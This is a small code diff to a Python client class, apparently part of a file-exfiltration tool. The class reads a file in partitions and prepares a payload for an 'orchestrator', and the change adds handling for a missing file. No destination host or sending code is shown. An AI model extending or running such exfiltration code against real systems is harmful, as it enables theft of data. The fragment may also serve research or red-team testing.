@@ -32,9 +32,14 @@ class Client():
 		print('--------------------------------------------------------------------------------')
 		print('Started Exfiltration...')
 		#----------We open the file and calculate the desired partitions--------------
-		file = open(self.filePath, "rb")
-		fileSize = os.stat(self.filePath).st_size
-		partitions = math.ceil(fileSize/self.partitionSize)
+		try:
+			file = open(self.filePath, "rb")
+			fileSize = os.stat(self.filePath).st_size
+			partitions = math.ceil(fileSize/self.partitionSize)
+		except FileNotFoundError:
+			print('The file provided was not found!')
+			print('Ending...')
+			return
 
 		#----------We create Json with amout of partitions for the orchestrator--------------
 		orqPayload = {
